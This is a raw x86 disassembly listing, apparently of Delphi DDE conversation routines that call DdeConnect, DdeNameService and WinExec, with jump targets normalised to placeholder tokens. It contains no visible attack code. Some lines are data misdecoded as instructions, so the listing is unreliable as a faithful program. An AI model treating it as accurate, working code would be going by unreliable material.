mov esp ebp
pop ebp
retn 0x20
mov [ ebp - 0x64 ] 0x60
cmp esi 0x8080
jne r-xdata
mov eax [ ebp + 0x24 ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax [ rw-data ]
call sub_488a6c
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp esi 0x4050
jg r-xdata
lea eax [ ebp - 0x64 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push ebx
call DdeQueryConvInfo
test eax eax
je r-xdata
sub esi 0x4090
je r-xdata
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_48a414
mov edi eax
jmp r-xdata
sub esi 0x3fb0
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x1c ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_48a4c8
mov edi eax
jmp r-xdata
sub esi 0x1030
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_48a3e4
jmp r-xdata
sub esi 0x40
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_48a2b0
mov edi eax
and edi 0x7f
jmp r-xdata
sub esi 0xff2
je r-xdata
mov eax [ ebp - 0x60 ]
test eax eax
je r-xdata
sub esi 0x42
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_48a4e8
mov edi eax
jmp r-xdata
sub esi 0x8e
je r-xdata
call sub_489654
jmp r-xdata
mov ebx [ ebp - 0x60 ]
test ebx ebx
je r-xdata
jmp r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_48a4e8
mov edi eax
jmp r-xdata
sub esi 0x1f60
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax [ ebp - 0x60 ]
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x1c ]
call sub_4896a0
jmp r-xdata
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_488b50
mov eax ebx
call sub_48965c
jmp r-xdata
sub_4887bc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_488870
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_421a7c
push r-xdata
call RegisterClipboardFormatA
mov [ esi + 0x48 ] ax
xor eax eax
mov [ esi + 0x44 ] eax
push 0x0
push 0x0
push sub_4885ac
lea eax [ esi + 0x44 ]
push eax
call DdeInitializeA
test eax eax
sete al
call sub_4884ac
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ esi + 0x38 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ esi + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ esi + 0x40 ] eax
lea edx [ ebp - 0x4 ]
xor eax eax
call sub_402a14
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_488b98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_488877
lea eax [ ebp - 0x4 ]
call sub_404118
retn
add esp 0xfffffff0
call sub_403668
sub_488899
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
push ebp
call sub_4036d0
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x3c ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x40 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x38 ]
call sub_40331c
xor eax eax
mov [ ebp + 0x38 ] eax
inc esi
xor edi edi
mov eax ebp
call sub_488c4c
mov eax [ ebp + 0x44 ]
push eax
call DdeUninitialize
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_421ac8
test bl bl
jle r-xdata
call sub_40331c
xor eax eax
mov [ ebp + 0x40 ] eax
mov eax [ ebp + 0x3c ]
call sub_40331c
xor eax eax
mov [ ebp + 0x3c ] eax
inc esi
xor edi edi
mov eax [ ebp + 0x38 ]
mov edx edi
call sub_418cf8
call sub_40331c
inc edi
dec esi
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4036b8
mov eax [ ebp + 0x3c ]
mov edx edi
call sub_418cf8
call sub_40331c
inc edi
dec esi
jne r-xdata
sub_488954
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_4889f8
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1008 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ edi + 0x44 ]
push eax
call DdeQueryStringA
mov ecx eax
lea edx [ ebp - 0x1008 ]
lea eax [ ebp - 0x8 ]
call sub_404208
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_488c78
test eax eax
je r-xdata
mov eax [ edi + 0x34 ]
push eax
push esi
call DdeCmpStringHandles
test eax eax
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_488cc8
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4889ff
lea eax [ ebp - 0x8 ]
call sub_404118
retn
mov bl 0x1
sub_488a08
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov esi ecx
mov ebp edx
mov ebx eax
xor edi edi
test esi esi
je r-xdata
mov eax edi
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esi
mov edx ebp
mov eax ebx
call sub_488954
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x34 ]
mov [ esp ] eax
mov [ esp + 0x4 ] esi
xor eax eax
mov [ esp + 0x8 ] eax
xor eax eax
mov [ esp + 0xc ] eax
push 0x0
push 0x1
push 0x0
push 0x0
push 0x10
lea eax [ esp + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateDataHandle
mov edi eax
sub_488a6c
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_488b3d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_48a1e8
mov ebx eax
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1008 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ esi + 0x44 ]
push eax
call DdeQueryStringA
mov ecx eax
lea edx [ ebp - 0x1008 ]
lea eax [ ebp - 0x8 ]
call sub_404208
lea eax [ ebx + 0x30 ]
mov edx [ ebp - 0x8 ]
call sub_40416c
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_488c78
mov [ ebx + 0x3c ] eax
cmp [ ebx + 0x3c ] 0x0
jne r-xdata
mov [ ebx + 0x40 ] edi
push ebx
push 0xffffffff
push edi
call DdeSetUserHandle
mov edx ebx
mov eax [ esi + 0x38 ]
call sub_418b9c
mov eax [ ebx + 0x3c ]
test eax eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_488cc8
mov [ ebx + 0x38 ] eax
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_488b44
lea eax [ ebp - 0x8 ]
call sub_404118
retn
mov si 0xffef
call sub_403518
sub_488b50
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax [ ebx + 0x3c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x40 ]
test eax eax
je r-xdata
mov si 0xffee
call sub_403518
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ edi + 0x38 ]
test eax eax
je r-xdata
push 0x0
push 0xffffffff
push eax
call DdeSetUserHandle
pop edi
pop esi
pop ebx
retn
mov edx ebx
call sub_418e94
mov eax ebx
call sub_40331c
sub_488b98
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_403a98#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_488c4c
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_408abc
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x30 ]
call sub_40416c
mov edx [ ebx + 0x30 ]
mov eax r-xdata
call sub_40471c
mov esi eax
test esi esi
je r-xdata
push 0x3ec
mov eax [ ebx + 0x30 ]
call sub_4045d8
push eax
mov eax [ ebx + 0x44 ]
push eax
call DdeCreateStringHandleA
mov esi eax
mov [ ebx + 0x34 ] esi
push 0x1
push 0x0
push esi
mov eax [ ebx + 0x44 ]
push eax
call DdeNameService
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_488c3b
lea eax [ ebp - 0x4 ]
call sub_404118
retn
mov eax [ ebx + 0x30 ]
call sub_4043d8
mov ecx eax
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_404678
sub_488c4c
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x34 ] eax
pop ebx
retn
push 0x2
push 0x0
push eax
mov eax [ ebx + 0x44 ]
push eax
call DdeNameService
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x44 ]
push eax
call DdeFreeStringHandle
sub_488c78
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
xor eax eax
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x40 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov eax [ ebp + 0x40 ]
mov edx edi
call sub_418cf8
mov ebx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_408210
test eax eax
jne r-xdata
sub_488cc8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
xor eax eax
push ebp
push j_sub_403a98#7
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46c05c
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_488d51
lea eax [ ebp - 0xc ]
call sub_404118
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x8 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_46c048
mov ebx eax
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_44e8b4
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_408210
test eax eax
jne r-xdata
sub_488d5c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
xor eax eax
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x38 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov eax [ ebp + 0x38 ]
mov edx edi
call sub_418cf8
mov ebx eax
mov edx [ esp ]
mov eax [ ebx + 0x30 ]
call sub_408210
test eax eax
jne r-xdata
sub_488dac
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4045c8
xor eax eax
push ebp
push sub_488e03
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax ebx
call sub_488d5c
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_488e0a
lea eax [ ebp - 0x4 ]
call sub_404118
retn
mov edx [ ebp - 0x4 ]
call sub_48a6d0
test eax eax
je r-xdata
call sub_48a8b4
sub_488e30
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_421a7c
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ esi + 0x9c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_488e78
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax esi
call sub_4894bc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421ac8
mov eax [ esi + 0x9c ]
call sub_40331c
xor eax eax
mov [ esi + 0x9c ] eax
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_488eb8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_421df4
push ebx
push sub_488f88
push ebx
push r-xdata
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov cl 0x1
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_488f05
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_488f7c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_421ecc
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x30 ]
call sub_4041b0
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x34 ]
call sub_4041b0
mov eax [ ebp - 0x4 ]
call sub_4043d8
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_488f83
cmp [ ebx + 0xc5 ] 0x1
je r-xdata
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_489278
sub_488f88
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_489033
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_41d878
jmp r-xdata
mov eax esi
call sub_41c914
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_41e518
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_40471c
mov ebx eax
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4043d8
mov ecx eax
sub ecx ebx
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x4 ]
call sub_404638
mov eax [ ebp - 0x4 ]
mov al [ eax ]
sub al 0x53
je r-xdata
mov eax esi
call sub_41d880
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48903a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40413c
retn
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_489760
jmp r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_489774
jmp r-xdata
sub_489047
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push j_sub_403a98#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41faac
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x30 ]
call sub_4041b0
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x10 ]
xor ecx ecx
mov eax r-xdata
call sub_409280
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_421220
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x34 ]
call sub_4041b0
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x10 ]
xor ecx ecx
mov eax r-xdata
call sub_409280
mov edx [ ebp - 0x14 ]
mov eax ebx
call sub_421220
mov eax ebx
call sub_41fab4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48910a
lea eax [ ebp - 0x14 ]
call sub_404118
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40413c
retn
sub_489138
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_489a4c
mov esi eax
mov eax [ ebx + 0x9c ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_418d74
mov [ esi + 0x10 ] edi
xor edx edx
mov eax esi
call sub_489abc
pop edi
pop esi
pop ebx
retn
sub_489170
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_489230
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_489abc
mov edx ebx
mov eax [ esi + 0x9c ]
call sub_418e94
mov eax ebx
call sub_40331c
sub_4891a8
push ebx
push esi
push edi
push ebp
push ecx
mov ebp ecx
mov edi edx
mov esi eax
mov [ esp ] 0x1
mov edx edi
mov eax esi
call sub_489230
mov ebx eax
test ebx ebx
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebp
call sub_4043d8
test eax eax
jle r-xdata
test ebx ebx
je r-xdata
mov eax ebp
call sub_4043d8
test eax eax
jne r-xdata
mov edx edi
mov eax esi
call sub_489138
mov edx edi
mov eax esi
call sub_489230
mov ebx eax
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax ebx
call sub_489abc
mov [ esp ] al
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_489170
jmp r-xdata
test [ esi + 0x1c ] 0x1
jne r-xdata
mov edx edi
mov eax esi
call sub_489170
sub_489230
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
xor eax eax
mov [ esp + 0x4 ] eax
xor ebx ebx
jmp r-xdata
movzx ebp bx
mov edi [ esi + 0x9c ]
cmp ebp [ edi + 0x8 ]
jl r-xdata
mov edx ebp
mov eax edi
call sub_418cf8
mov edx [ eax + 0x10 ]
cmp edx [ esp ]
jne r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
mov [ esp + 0x4 ] eax
jmp r-xdata
sub_489278
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_4894bc
mov edx ebx
mov eax esi
call sub_489760
mov edx edi
mov eax esi
call sub_489774
mov eax esi
call sub_4892c8
mov ebx eax
test bl bl
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
xor edx edx
mov eax esi
call sub_489760
xor edx edx
mov eax esi
call sub_489774
sub_4892c8
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x108 ] edx
mov edi eax
xor eax eax
push ebp
push sub_48949e
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
cmp [ edi + 0x38 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4894a5
lea eax [ ebp - 0x108 ]
call sub_404118
retn
mov eax [ edi + 0x30 ]
call sub_4043d8
test eax eax
jne r-xdata
cmp [ edi + 0xa0 ] 0x0
jne r-xdata
mov eax [ edi + 0x34 ]
call sub_4043d8
test eax eax
jne r-xdata
cmp [ edi + 0xa4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x101 ]
mov edx [ edi + 0x30 ]
call sub_408c3c
push 0x3ec
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ edi + 0xa0 ] eax
mov eax edi
call sub_48953c
jmp r-xdata
mov ecx [ edi + 0xa4 ]
mov edx [ edi + 0xa0 ]
mov eax edi
call sub_48957c
mov ebx eax
test bl bl
jne r-xdata
lea eax [ ebp - 0x101 ]
mov edx [ edi + 0x34 ]
call sub_408c3c
push 0x3ec
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ edi + 0xa4 ] eax
test bl bl
jne r-xdata
mov eax [ edi + 0x30 ]
call sub_4043d8
test eax eax
jne r-xdata
mov eax [ edi + 0x58 ]
test eax eax
je r-xdata
mov eax edi
call sub_48953c
jmp r-xdata
mov eax [ edi + 0xc0 ]
call sub_4043d8
test eax eax
je r-xdata
mov eax [ edi + 0xc0 ]
call sub_4043d8
test eax eax
je r-xdata
mov [ edi + 0xa8 ] 0x1
mov [ edi + 0xa8 ] eax
jmp r-xdata
push [ edi + 0x30 ]
push r-xdata
push [ edi + 0x34 ]
lea eax [ ebp - 0x108 ]
mov edx 0x3
call sub_404498
mov edx [ ebp - 0x108 ]
lea eax [ ebp - 0x101 ]
call sub_408c3c
lea eax [ ebp - 0x101 ]
mov edx [ edi + 0xc0 ]
call sub_408c3c
jmp r-xdata
mov eax edi
mov si 0xffee
call sub_403518
xor ecx ecx
xor edx edx
mov eax edi
call sub_4896a0
mov [ ebp - 0x1 ] 0x1
mov eax edi
call sub_4895f4
test al al
je r-xdata
mov ecx [ edi + 0xa4 ]
mov edx [ edi + 0xa0 ]
mov eax edi
call sub_48957c
mov ebx eax
push 0x7
lea eax [ ebp - 0x101 ]
push eax
call WinExec
cmp eax 0x20
jb r-xdata
sub_4894bc
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
mov esi eax
mov eax ebx
call sub_48965c
xor eax eax
mov [ ebx + 0x38 ] eax
push 0x0
push 0xffffffff
push esi
call DdeSetUserHandle
push esi
call DdeDisconnect
mov eax [ ebx + 0xa4 ]
test eax eax
je r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0xa0 ] eax
xor edx edx
mov eax ebx
call sub_489760
xor edx edx
mov eax ebx
call sub_489774
pop esi
pop ebx
retn
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0xa4 ] eax
sub_48953c
push ebx
push esi
mov esi eax
mov eax [ esi + 0x9c ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov bx [ eax + 0x8 ]
dec ebx
test bx bx
jb r-xdata
inc ebx
mov eax [ esi + 0x9c ]
xor edx edx
call sub_418cf8
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x10 ]
call sub_489938
dec bx
jne r-xdata
sub_48957c
push ebx
push esi
push edi
push ebp
add esp 0xffffffdc
mov ebp ecx
mov edi edx
mov esi eax
mov eax esp
xor ecx ecx
mov edx 0x24
call sub_402d00
mov [ esp ] 0x24
mov [ esp + 0xc ] 0x3ec
push esp
push ebp
push edi
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeConnect
mov ebx eax
mov [ esi + 0x38 ] ebx
test ebx ebx
setne al
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x24
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x3c ] 0x60
lea eax [ esi + 0x3c ]
push eax
push 0xffffffff
mov eax [ esi + 0x38 ]
push eax
call DdeQueryConvInfo
push esi
push 0xffffffff
mov eax [ esi + 0x38 ]
push eax
call DdeSetUserHandle
sub_4895f4
push ebx
push esi
push edi
push ebp
mov esi eax
xor eax eax
cmp [ esi + 0x38 ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
xor ebx ebx
jmp r-xdata
movzx ebp bx
mov edi [ esi + 0x9c ]
cmp ebp [ edi + 0x8 ]
jl r-xdata
mov edx ebp
mov eax edi
call sub_418cf8
mov edi eax
mov eax edi
call sub_489cbc
test al al
jne r-xdata
mov al 0x1
inc ebx
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ edi + 0x10 ]
call sub_489938
jmp r-xdata
movzx eax bx
mov edx [ esi + 0x9c ]
cmp eax [ edx + 0x8 ]
jge r-xdata
sub_48965c
push ebx
push esi
push edi
push ebp
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
xor eax eax
mov [ edi + 0x38 ] eax
xor ebx ebx
jmp r-xdata
mov eax edi
mov si 0xffef
call sub_403518
movzx ebp bx
mov esi [ edi + 0x9c ]
cmp ebp [ esi + 0x8 ]
jl r-xdata
mov edx ebp
mov eax esi
call sub_418cf8
call sub_489db4
inc ebx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4896a0
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov [ esp ] edx
mov esi eax
xor ebx ebx
jmp r-xdata
movzx eax bx
mov ebp [ esi + 0x9c ]
cmp eax [ ebp + 0x8 ]
jl r-xdata
movzx edx bx
mov eax ebp
call sub_418cf8
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ esp ]
call sub_489b68
cmp edi [ eax + 0x8 ]
jne r-xdata
inc ebx
sub_4896e0
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0xc5 ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov [ esi + 0xc5 ] bl
mov eax [ esi + 0x30 ]
call sub_4043d8
test eax eax
je r-xdata
mov eax [ esi + 0x34 ]
call sub_4043d8
test eax eax
je r-xdata
mov eax esi
call sub_4892c8
test al al
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be48
call sub_403ad0
sub_4897c8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] cl
mov [ esp ] edx
mov ebx eax
mov cl [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
call sub_421d98
cmp [ esp + 0x4 ] 0x1
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x9c ] 0x0
je r-xdata
xor esi esi
jmp r-xdata
movzx edi si
mov ebp [ ebx + 0x9c ]
cmp edi [ ebp + 0x8 ]
jl r-xdata
mov edx edi
mov eax ebp
call sub_418cf8
mov edx [ eax + 0x10 ]
cmp edx [ esp ]
jne r-xdata
mov eax [ ebx + 0x9c ]
cmp edi [ eax + 0x8 ]
jge r-xdata
mov eax edx
mov edx [ rw-data ]
mov edx [ edx ]
call sub_489938
inc esi
sub_48983c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_421a7c
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ esi + 0x30 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_489880
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x30 ]
call sub_40331c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421ac8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_4898b0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_48992b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ ebx + 0x34 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489932
lea eax [ ebp - 0x4 ]
call sub_404118
retn
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x38 ]
call sub_4041b0
lea eax [ ebx + 0x38 ]
call sub_404118
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
mov eax esi
